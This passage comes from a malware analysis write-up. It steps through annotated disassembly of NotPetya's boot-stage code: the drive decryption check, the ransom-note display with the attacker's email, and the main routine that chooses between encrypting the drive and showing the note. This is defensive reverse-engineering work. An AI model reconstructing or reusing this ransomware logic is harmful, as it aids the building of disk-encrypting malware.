0000:82a0      leave

0000:82a1      ret
```

We can just rename this function `decryptionRoutine`.

##### Back to fcn.000082a2
We can get a rough idea of what the function does. We see that sector `32` and `33` are read and stored into memory. Then sector `33` is pushed into the `encryptionRoutine` function. And it does what it says, it encrypts again sector `33`. But this time with a twist. Salsa20 decryption is the same thing as the encryption, as with the chiphertext the encryption does exactly the opposite result.

Anyways, after decrypting sector `33`, it checks if it's filled with `0x7`. In that case, the first byte of sector `32` is changed from `1` to `2`, sector 32 is put back into the drive, and the decryption routine begins. Here is what the function looks like:

```s
0000:82a2      enter   0x444, 0
0000:82a6      push    di
0000:82a7      push    si

0000:82a8      cmp     byte [bp + 0xa], 0x20
0000:82ac      jae     0x82b3
0000:82ae      xor     al, al

0000:82b0      jmp     0x8422
0000:82b3      mov     byte [bp - 2], 0
0000:82b7      mov     si, word [bp - 2]

0000:82ba      and     si, 0xff
0000:82be      mov     byte [bp + si - 0x24], 0
0000:82c2      inc     byte [bp - 2]

0000:82c5      cmp     byte [bp - 2], 0x20
0000:82c9      jb      0x82b7
0000:82cb      xor     al, al

0000:82cd      mov     byte [bp - 3], al
0000:82d0      mov     byte [bp - 2], al
0000:82d3      mov     si, word [bp + 8]

0000:82d6      jmp     0x8324
0000:82d8      cmp     byte [bp - 3], 0x20
0000:82dc      ja      0x832c

0000:82de      xor     al, al
0000:82e0      mov     byte [bp - 4], al
0000:82e3      mov     byte [bp - 1], al

0000:82e6      cmp     byte [bp - 1], 0x10
0000:82ea      jae     0x8307
0000:82ec      mov     bl, byte [bp - 1]

0000:82ef      sub     bh, bh
0000:82f1      mov     di, word [0x9a86]
0000:82f5      mov     al, byte [bx + di]

0000:82f7      mov     bl, byte [bp - 2]
0000:82fa      cmp     al, byte [bx + si]
0000:82fc      je      0x8303

0000:82fe      inc     byte [bp - 1]
0000:8301      jmp     0x82e6
0000:8303      mov     byte [bp - 4], 1

0000:8307      cmp     byte [bp - 4], 1
0000:830b      jne     0x8321
0000:830d      mov     bl, byte [bp - 2]

0000:8310      sub     bh, bh
0000:8312      mov     al, byte [bx + si]
0000:8314      mov     di, word [bp - 3]

0000:8317      and     di, 0xff
0000:831b      mov     byte [bp + di - 0x24], al
0000:831e      inc     byte [bp - 3]

0000:8321      inc     byte [bp - 2]
0000:8324      mov     al, byte [bp + 0xa]
0000:8327      cmp     byte [bp - 2], al

0000:832a      jb      0x82d8
0000:832c      push    0
0000:832e      push    0x20

0000:8330      lea     ax, [bp - 0x24]
0000:8333      push    ax
0000:8334      lea     ax, [bp - 0x44]

0000:8337      push    ax
0000:8338      call    doSomeLogic
0000:833b      add     sp, 8

0000:833e      mov     byte [bp - 2], 0
0000:8342      push    0
0000:8344      push    0x20

0000:8346      lea     ax, [bp - 0x44]
0000:8349      push    ax
0000:834a      push    ax

0000:834b      call    doSomeLogic
0000:834e      add     sp, 8
0000:8351      inc     byte [bp - 2]

0000:8354      cmp     byte [bp - 2], 0x80
0000:8358      jb      0x8342
0000:835a      push    0

0000:835c      push    1
0000:835e      push    0
0000:8360      push    0x20

0000:8362      lea     ax, [bp - 0x244]                 ; Address where sector 32 is saved
0000:8366      push    ax
0000:8367      mov     al, byte [bp + 6]

0000:836a      push    ax
0000:836b      call    storeSectorIntoMemory
0000:836e      add     sp, 0xc

0000:8371      push    0
0000:8373      push    1
0000:8375      push    0

0000:8377      push    0x21
0000:8379      lea     ax, [bp - 0x444]                 ; Address where sector 33 is saved
0000:837d      push    ax

0000:837e      mov     cl, byte [bp + 6]
0000:8381      push    cx
0000:8382      call    storeSectorIntoMemory

0000:8385      add     sp, 0xc
0000:8388      push    0
0000:838a      push    0x200

0000:838d      lea     ax, [bp - 0x444]                 ; Push the address of sector 33 into the stack for the decryption routine
0000:8391      push    ax
0000:8392      push    0

0000:8394      push    0
0000:8396      lea     ax, [bp - 0x223]
0000:839a      push    ax

0000:839b      lea     ax, [bp - 0x44]
0000:839e      push    ax
0000:839f      call    encryptionRoutine                ; Decrypt sector 33

0000:83a2      add     sp, 0xe
0000:83a5      sub     eax, eax
0000:83a8      mov     dword [bp - 4], eax

0000:83ac      cmp     dword [bp - 4], 0x200            ; This snippet assures that sector 33 is full of 0x7 (AKA the decryption was successfull)
0000:83b4      jae     0x83c8
0000:83b6      mov     si, word [bp - 4]

0000:83b9      cmp     byte [bp + si - 0x444], 7
0000:83be      jne     0x82ae
0000:83c2      inc     dword [bp - 4]

0000:83c6      jmp     0x83ac
0000:83c8      mov     byte [bp - 0x244], 2             ; Change the first byte of sector 32 to 2
0000:83cd      mov     dword [bp - 4], 0
0000:83d5      cmp     dword [bp - 4], 0x10

0000:83da      jae     0x83ec
0000:83dc      mov     si, word [bp - 4]
0000:83df      mov     al, byte [bp + si - 0x44]

0000:83e2      mov     byte [bp + si - 0x243], al
0000:83e6      inc     dword [bp - 4]
0000:83ea      jmp     0x83d5

0000:83ec      push    1
0000:83ee      push    1
0000:83f0      push    0

0000:83f2      push    0x20
0000:83f4      lea     ax, [bp - 0x244]                 ; Address of sector 32
0000:83f8      push    ax

0000:83f9      mov     al, byte [bp + 6]
0000:83fc      push    ax
0000:83fd      call    storeSectorIntoMemory            ; Store back sector 32 on the drive

0000:8400      add     sp, 0xc
0000:8403      push    0x9ca2
0000:8406      call    printPushedString

0000:8409      pop     bx
0000:840a      lea     ax, [bp - 0x223]
0000:840e      push    ax

0000:840f      lea     ax, [bp - 0x44]
0000:8412      push    ax
0000:8413      mov     al, byte [bp + 6]

0000:8416      push    ax
0000:8417      push    word [bp + 4]
0000:841a      call    decryptionRoutine

0000:841d      add     sp, 8
0000:8420      mov     al, 1
0000:8422      pop     si

0000:8423      pop     di
0000:8424      leave
0000:8425      ret
```

We can rename this function `decryptDrive`.

##### Back to fcn.00008426
Now we can finally have a complete disassembly view of `fcn.00008426`. Or should we call it `ransomNoteAndDecryption`?

```s
0000:8426      enter   0x24c, 0
0000:842a      push    di
0000:842b      push    si

0000:842c      call    clsButIfJmpPathedOtherFunctions
0000:842f      push    0
0000:8431      push    1

0000:8433      push    0
0000:8435      push    0x20
0000:8437      lea     ax, [bp - 0x24c]                                                         ; Address 0x7722

0000:843b      push    ax
0000:843c      mov     al, byte [bp + 6]
0000:843f      push    ax

0000:8440      call    storeSectorIntoMemory                                                    ; Store sector 32 in memory, used to pick up the BitCoin and the Installation Key
0000:8443      add     sp, 0xc
0000:8446      push    str.Ooops__your_important_files_are_encrypted.                           ; 0x9ca6

0000:8449      call    printPushedString
0000:844c      pop     bx
0000:844d      push    0x50

0000:844f      push    0xffffffffffffffdc
0000:8451      call    printCharCoupleTimes
0000:8454      add     sp, 4

0000:8457      push    str.If_you_see_this_text__then_your_files_are_no_longer_accessible__because_they___have_been_encrypted.__Perhaps_you_are_busy_looking_for_a_way_to_recover_your___files__but_don_t_waste_your_time.__Nobody_can_recover_your_files_without_our___decryption_service._____We_guarantee_that_you_can_recover_all_your_files_safely_and_easily.__All_you___need_to_do_is_submit_the_payment_and_purchase_the_decryption_key._____Please_follow_the_instructions:_____1._Send__300_worth_of_Bitcoin_to_following_address:    ; 0x9cd6
0000:845a      call    printPushedString
0000:845d      pop     bx

0000:845e      lea     ax, [bp - 0x223]                                                         ; Address 0x774b
0000:8462      push    ax
0000:8463      call    printPushedString ; Print the Bitcoin address

0000:8466      pop     bx
0000:8467      push    0x9ed5
0000:846a      call    printPushedString ; Those are some spaces

0000:846d      pop     bx
0000:846e      lea     ax, [bp - 0x1e3]
0000:8472      push    ax

0000:8473      call    printPushedString
0000:8476      pop     bx
0000:8477      push    str.2._Send_your_Bitcoin_wallet_ID_and_personal_installation_key_to_e_mail______wowsmith123456_posteo.net._Your_personal_installation_key: ; 0x9edc

0000:847a      call    printPushedString
0000:847d      pop     bx
0000:847e      lea     ax, [bp - 0x1a3]

0000:8482      push    ax
0000:8483      call    printPIKey
0000:8486      pop     bx

0000:8487      push    0x9f6c
0000:848a      call    printPushedString                                                        ; This simply prints two times the "\n\r\n\r"
0000:848d      pop     bx

0000:848e      nop
0000:848f      nop
0000:8490      nop

0000:8491      push    str.If_you_already_purchased_your_key__please_enter_it_below.            ; 0x9f71
0000:8494      call    printPushedString
0000:8497      pop     bx

0000:8498      mov     si, word [bp + 4]
0000:849b      push    str.Key:                                                                 ; 0x9fae
0000:849e      call    printPushedString

0000:84a1      pop     bx
0000:84a2      mov     byte [bp - 1], 0
0000:84a6      mov     di, word [bp - 1]

0000:84a9      and     di, 0xff
0000:84ad      mov     byte [bp + di - 0x4c], 0
0000:84b1      inc     byte [bp - 1]

0000:84b4      cmp     byte [bp - 1], 0x4a
0000:84b8      jb      0x84a6
0000:84ba      push    0x49

0000:84bc      lea     ax, [bp - 0x4c]
0000:84bf      push    ax
0000:84c0      call    getUserKey

0000:84c3      add     sp, 4
0000:84c6      push    ax
0000:84c7      lea     ax, [bp - 0x4c]

0000:84ca      push    ax
0000:84cb      mov     al, byte [bp + 6]
0000:84ce      push    ax

0000:84cf      push    si
0000:84d0      call    decryptDrive
0000:84d3      add     sp, 8

0000:84d6      dec     al
0000:84d8      je      0x84e3
0000:84da      push    str.Incorrect_key__Please_try_again.                                     ; 0x9fb5

0000:84dd      call    printPushedString
0000:84e0      pop     bx
0000:84e1      jmp     0x849b

0000:84e3      pop     si
0000:84e4      pop     di
0000:84e5      leave

0000:84e6      ret
```

##### Back to address 0x0000:0x8000
Now, with all the data we have, we can also reconstruct the main function which calls all of the others:

```s
0000:8000      jmp     0x84e8      ; Jump to the main function

; Omitting the middle code because it is not part of the "function"

0000:84e8      enter   0x286, 0
0000:84ec      push    si
0000:84ed      call    initializeScreen

0000:84f0      call    clsAndPutWordInBX
0000:84f3      lea     ax, [bp - 0x86]
0000:84f7      push    ax

0000:84f8      call    storeSectorInMemoryAndDoLogic
0000:84fb      pop     bx                                           ; Value 0x7b78 is popped in BX
0000:84fc      or      al, al                                       ; This just sets the ZF

0000:84fe      jne     0x8506                                       ; Jump if ZF = 0
0000:8500      call    handleErrorAndReboot
0000:8503      pop     si

0000:8504      leave
0000:8505      ret
0000:8506      sub     eax, eax

0000:8509      mov     dword [bp - 6], eax
0000:850d      mov     byte [bp - 1], al
0000:8510      mov     byte [bp - 2], al

0000:8513      jmp     0x856a
0000:8515      mov     ax, word [bp - 6]
0000:8518      mov     dx, word [bp - 4]

0000:851b      mov     si, word [bp - 1]
0000:851e      and     si, 0xff
0000:8522      shl     si, 3

0000:8525      cmp     word [bp + si - 0x80], dx
0000:8528      jb      0x8545
0000:852a      ja      0x8532

0000:852c      cmp     word [bp + si - 0x82], ax
0000:8530      jbe     0x8545
0000:8532      mov     si, word [bp - 1]

0000:8535      and     si, 0xff
0000:8539      shl     si, 3
0000:853c      mov     eax, dword [bp + si - 0x82]

0000:8541      mov     dword [bp - 6], eax
0000:8545      mov     si, word [bp - 1]
0000:8548      and     si, 0xff

0000:854c      shl     si, 3
0000:854f      cmp     byte [bp + si - 0x85], 1
0000:8554      jne     0x8567

0000:8556      mov     si, word [bp - 1]
0000:8559      and     si, 0xff
0000:855d      shl     si, 3

0000:8560      mov     al, byte [bp + si - 0x86]
0000:8564      mov     byte [bp - 2], al
0000:8567      inc     byte [bp - 1]

0000:856a      mov     si, word [bp - 1]
0000:856d      and     si, 0xff
0000:8571      shl     si, 3

0000:8574      cmp     byte [bp + si - 0x84], 1
0000:8579      je      0x8515
0000:857b      cmp     byte [bp - 2], 0

0000:857f      je      0x859c
0000:8581      push    0
0000:8583      push    1

0000:8585      push    0
0000:8587      push    0x20
0000:8589      lea     ax, [bp - 0x286]

0000:858d      push    ax
0000:858e      mov     al, byte [bp - 2]
0000:8591      push    ax

0000:8592      call    storeSectorIntoMemory
0000:8595      add     sp, 0xc
0000:8598      or      al, al

0000:859a      je      0x859f
0000:859c      jmp     0x8500
0000:859f      cmp     byte [bp - 0x286], 1                         ; Check if the first byte of sector 32 is 0

0000:85a4      jb      0x85b8                                       ;
0000:85a6      mov     al, byte [bp - 2]
0000:85a9      push    ax

0000:85aa      lea     ax, [bp - 0x86]
0000:85ae      push    ax
0000:85af      call    ransomNoteAndDecryption

0000:85b2      add     sp, 4
0000:85b5      pop     si
0000:85b6      leave

0000:85b7      ret
0000:85b8      mov     al, byte [bp - 2]                            ; Drive number
0000:85bb      push    ax

0000:85bc      push    dword [bp - 6]
0000:85c0      lea     ax, [bp - 0x86]                              ; Address 0x7978
0000:85c4      push    ax

0000:85c5      call    prepareKeyAndEncryptDrive
0000:85c8      add     sp, 8
0000:85cb      pop     si

0000:85cc      leave
0000:85cd      ret
```

We can also rename the `fcn.00000000` (which is referenced this way because I padded the bytes) to `addr8000`, the actual function start.

And just like that, we've officially completed our NotPetya's journey! That's all the malware does!